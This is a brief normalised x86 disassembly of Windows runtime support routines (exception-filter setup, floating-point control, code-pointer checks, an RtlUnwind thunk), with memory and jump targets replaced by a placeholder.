call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_4095a5
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_405e02
add esp 0x8
pop ebp
retn 0x4
sub_4099b1
push 0x30000
push 0x10000
call sub_40aca2
pop ecx
pop ecx
retn
sub_409ad2
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ rwxdata ]
fnstsw ax
sahf
jb rwxdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_409da5
push [ esp + 0x10 ]
mov [ rwxdata ] 0x1
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_409b28
and [ rwxdata ] 0x0
add esp 0x10
retn
sub_409dcc
push [ esp + 0xc ]
mov [ rwxdata ] 0x1
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_409c2c
and [ rwxdata ] 0x0
add esp 0xc
retn
sub_409f98
push 0x1
pop eax
retn
sub_40a58e
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je rwxdata
mov eax esi
pop esi
retn
xor esi esi
sub_40a710
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40a721
add esp 0xc
retn
sub_40ab16
cmp [ rwxdata ] 0x0
jne rwxdata
retn
push 0xfffffffd
call sub_40a752
pop ecx
mov [ rwxdata ] 0x1
sub_40abbb
int3
sub_40abbc
int3
sub_40aca2
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_40ac6d
pop ecx
pop ecx
retn
sub_40b204
push rwxdata
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40b098
add esp 0xc
retn
sub_40b21a
push rwxdata
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40b098
add esp 0xc
retn
sub_40b41b
push 0x2
call sub_4063f4
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
